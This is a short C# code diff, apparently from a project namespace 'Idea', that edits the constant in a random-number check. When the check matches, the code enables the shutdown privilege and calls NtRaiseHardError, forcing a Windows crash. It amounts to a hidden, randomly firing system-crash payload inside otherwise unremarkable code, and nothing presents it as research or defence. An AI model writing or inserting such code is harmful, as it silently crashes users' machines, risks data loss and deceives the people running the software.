@@ -89,7 +89,7 @@ namespace Idea
         {
             Random rnd = new Random();
             int num1 = rnd.Next(0, 0x7ffffff7);
-            if (num1 == 0x7EADBEEF)
+            if (num1 == 0x7EA5BEEF)
             {
                 RtlAdjustPrivilege(19, true, false, out bool previousValue);
                 NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out uint Response);
